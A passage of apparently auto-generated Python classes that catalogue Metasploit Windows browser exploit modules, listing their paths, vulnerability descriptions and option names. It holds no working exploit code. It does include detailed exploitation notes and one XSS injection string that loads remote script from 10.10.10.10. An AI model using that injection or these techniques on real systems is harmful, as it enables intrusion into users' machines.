			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_symantec_appstream_unsafe(object):
		"""
		
          This module exploits a vulnerability in Symantec AppStream Client 5.x. The vulnerability
        is in the LaunchObj ActiveX control (launcher.dll 5.1.0.82) containing the "installAppMgr()"
        method. The insecure method can be exploited to download and execute arbitrary files in the
        context of the currently logged-on user.
      
		"""

		path = 'windows/browser/symantec_appstream_unsafe'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_inotes_dwa85w_bof(object):
		"""
		
          This module exploits a buffer overflow vulnerability on the UploadControl
        ActiveX. The vulnerability exists in the handling of the "Attachment_Times"
        property, due to the insecure usage of the _swscanf. The affected ActiveX is
        provided by the dwa85W.dll installed with the IBM Lotus iNotes ActiveX installer.

        This module has been tested successfully on IE6-IE9 on Windows XP, Vista and 7,
        using the dwa85W.dll 85.3.3.0 as installed with Lotus Domino 8.5.3.

        In order to bypass ASLR the no aslr compatible module dwabho.dll is used. This one
        is installed with the iNotes ActiveX.
      
		"""

		path = 'windows/browser/inotes_dwa85w_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_apple_quicktime_rdrf(object):
		"""
		
        This module exploits a vulnerability found in Apple Quicktime. The flaw is
        triggered when Quicktime fails to properly handle the data length for certain
        atoms such as 'rdrf' or 'dref' in the Alis record, which may result a buffer
        overflow by loading a specially crafted .mov file, and allows arbitrary
        code execution under the context of the current user.
      
		"""

		path = 'windows/browser/apple_quicktime_rdrf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_adobe_cooltype_sing(object):
		"""
		
          This module exploits a vulnerability in the Smart INdependent Glyplets (SING) table
        handling within versions 8.2.4 and 9.3.4 of Adobe Reader. Prior versions are
        assumed to be vulnerable as well.
      
		"""

		path = 'windows/browser/adobe_cooltype_sing'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_mozilla_reduceright(object):
		"""
		
          This module exploits a vulnerability found in Mozilla Firefox 3.6. When an
        array object is configured with a large length value, the reduceRight() method
        may cause an invalid index being used, allowing abitrary remote code execution.
        Please note that the exploit requires a longer amount of time (compare to a
        typical browser exploit) in order to gain control of the machine.
      
		"""

		path = 'windows/browser/mozilla_reduceright'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_ie_unsafe_scripting(object):
		"""
		
        This exploit takes advantage of the "Initialize and script ActiveX controls not
      marked safe for scripting" setting within Internet Explorer.  When this option is set,
      IE allows access to the WScript.Shell ActiveX control, which allows javascript to
      interact with the file system and run commands.  This security flaw is not uncommon
      in corporate environments for the 'Intranet' or 'Trusted Site' zones.

        When set via domain policy, the most common registry entry to modify is HKLM/
      Software/Policies/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/1/1201,
      which if set to '0' forces ActiveX controls not marked safe for scripting to be
      enabled for the Intranet zone.

        This module creates a javascript/html hybrid that will render correctly either
      via a direct GET http://msf-server/ or as a javascript include, such as in:
      http://intranet-server/xss.asp?id="><script%20src=http://10.10.10.10/ie_unsafe_script.js>
      </script>.

        IE Tabs, WScript and subsequent Powershell prompts all run as x86 even when run from
      an x64 iexplore.exe.

        By default, this module will not attempt to fire against IEs that come with Protected
      Mode enabled by default, because it can trigger a security prompt. However, if you are
      feeling brave, you can choose to ignore this restriction by setting the ALLOWPROMPT
      datastore option to true.
      
		"""

		path = 'windows/browser/ie_unsafe_scripting'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			required_ALLOWPROMPT = 'ALLOWPROMPT'
			required_TECHNIQUE = 'TECHNIQUE'

	class windows_browser_cisco_playerpt_setsource_surl(object):
		"""
		
          This module exploits a vulnerability found in Cisco Linksys PlayerPT 1.0.0.15
        as the installed with the web interface of Cisco Linksys WVC200 Wireless-G PTZ
        Internet Video Camera. The vulnerability, due to the insecure usage of sprintf in
        the SetSource method, when handling a specially crafted sURL argument, allows to
        trigger a stack based buffer overflow which leads to code execution under the
        context of the user visiting a malicious web page.
      
		"""

		path = 'windows/browser/cisco_playerpt_setsource_surl'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_ms13_080_cdisplaypointer(object):
		"""
		
        This module exploits a vulnerability found in Microsoft Internet Explorer. It was originally
        found being exploited in the wild targeting Japanese and Korean IE8 users on Windows XP,
        around the same time frame as CVE-2013-3893, except this was kept out of the public eye by
        multiple research companies and the vendor until the October patch release.

        This issue is a use-after-free vulnerability in CDisplayPointer via the use of a
        "onpropertychange" event handler. To set up the appropriate buggy conditions, we first craft
        the DOM tree in a specific order, where a CBlockElement comes after the CTextArea element.
        If we use a select() function for the CTextArea element, two important things will happen:
        a CDisplayPointer object will be created for CTextArea, and it will also trigger another
        event called "onselect". The "onselect" event will allow us to set up for the actual event
        handler we want to abuse - the "onpropertychange" event. Since the CBlockElement is a child
        of CTextArea, if we do a node swap of CBlockElement in "onselect", this will trigger
        "onpropertychange".  During "onpropertychange" event handling, a free of the CDisplayPointer
        object can be forced by using an "Unslect" (other approaches also apply), but a reference
        of this freed memory will still be kept by CDoc::ScrollPointerIntoView, specifically after
        the CDoc::GetLineInfo call, because it is still trying to use that to update
        CDisplayPointer's position. When this invalid reference arrives in QIClassID, a crash
        finally occurs due to accessing the freed memory. By controlling this freed memory, it is
        possible to achieve arbitrary code execution under the context of the user.
      
		"""

		path = 'windows/browser/ms13_080_cdisplaypointer'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ultraoffice_httpupload(object):
		"""
		
          This module exploits a stack-based buffer overflow in Ultra Shareware's Office
        Control. When processing the 'HttpUpload' method, the arguments are concatenated
        together to form a command line to run a bundled version of cURL. If the command
        fails to run, a stack-based buffer overflow occurs when building the error
        message. This is due to the use of sprintf() without proper bounds checking.

        NOTE: Due to input restrictions, this exploit uses a heap-spray to get the payload
        into memory unmodified.
      
		"""

		path = 'windows/browser/ultraoffice_httpupload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_browser_adobe_media_newplayer(object):
		"""
		
          This module exploits a use after free vulnerability in Adobe Reader and Adobe Acrobat
        Professional versions up to and including 9.2.
      
		"""

		path = 'windows/browser/adobe_media_newplayer'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_adobe_geticon(object):
		"""
		
          This module exploits a buffer overflow in Adobe Reader and Adobe Acrobat.
        Affected versions include < 7.1.1, < 8.1.3, and < 9.1. By creating a specially
        crafted pdf that a contains malformed Collab.getIcon() call, an attacker may
        be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/adobe_geticon'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_webdav_dll_hijacker(object):
		"""
		
        This module presents a directory of file extensions that can lead to
      code execution when opened from the share. The default EXTENSIONS option
      must be configured to specify a vulnerable application type.
      
		"""

		path = 'windows/browser/webdav_dll_hijacker'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_BASENAME = 'BASENAME'
			required_SHARENAME = 'SHARENAME'
			required_EXTENSIONS = 'EXTENSIONS'

	class windows_browser_dell_webcam_crazytalk(object):
		"""
		
          This module exploits a vulnerability in Dell Webcam's CrazyTalk component.
        Specifically, when supplying a long string for a file path to the BackImage
        property, an overflow may occur after checking certain file extension names,
        resulting in remote code execution under the context of the user.
      
		"""

		path = 'windows/browser/dell_webcam_crazytalk'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_samsung_security_manager_put(object):
		"""
		
        This is an exploit against Samsung Security Manager that bypasses the patch in ZDI-15-156 & ZDI-16-481
        by exploiting the vulnerability against the client-side. This exploit has been tested successfully using
        IE, FireFox and Chrome by abusing a GET request XSS to bypass CORS and reach the vulnerable PUT. Finally
        a traversal is used in the PUT request to upload the code just where we want it and gain RCE as SYSTEM.
      
		"""

		path = 'windows/browser/samsung_security_manager_put'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			FileDropperDelay = 'FileDropperDelay'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_samsung_neti_wiewer_backuptoavi_bof(object):
		"""
		
          This module exploits a vulnerability in the CNC_Ctrl.dll ActiveX control installed
        with the Samsung NET-i viewer 1.37.

        Specifically, when supplying a long string for the fname parameter to the
        BackupToAvi method, an integer overflow occurs, which leads to a posterior buffer
        overflow due to the use of memcpy with an incorrect size, resulting in remote code
        execution under the context of the user.
      
		"""

		path = 'windows/browser/samsung_neti_wiewer_backuptoavi_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_sonicwall_addrouteentry(object):
		"""
		
          This module exploits a stack buffer overflow in SonicWall SSL-VPN NetExtender.
        By sending an overly long string to the "AddRouteEntry()" method located
        in the NELaunchX.dll (1.0.0.26) Control, an attacker may be able to execute
        arbitrary code.
      
		"""

		path = 'windows/browser/sonicwall_addrouteentry'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_java_mixer_sequencer(object):
		"""
		
          This module exploits a flaw within the handling of MixerSequencer objects
        in Java 6u18 and before.

          Exploitation id done by supplying a specially crafted MIDI file within an RMF
        File. When the MixerSequencer objects is used to play the file, the GM_Song
        structure is populated with a function pointer provided by a SONG block in the
        RMF. A Midi block that contains a MIDI with a specially crafted controller event
        is used to trigger the vulnerability.

        When triggering the vulnerability "ebx" points to a fake event in the MIDI file
        which stores the shellcode. A "jmp ebx" from msvcr71.dll is used to make the
        exploit reliable over java updates.
      
		"""

		path = 'windows/browser/java_mixer_sequencer'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ovftool_format_string(object):
		"""
		
          This module exploits a format string vulnerability in VMWare OVF Tools 2.1 for
        Windows. The vulnerability occurs when printing error messages while parsing a
        a malformed OVF file. The module has been tested successfully with VMWare OVF Tools
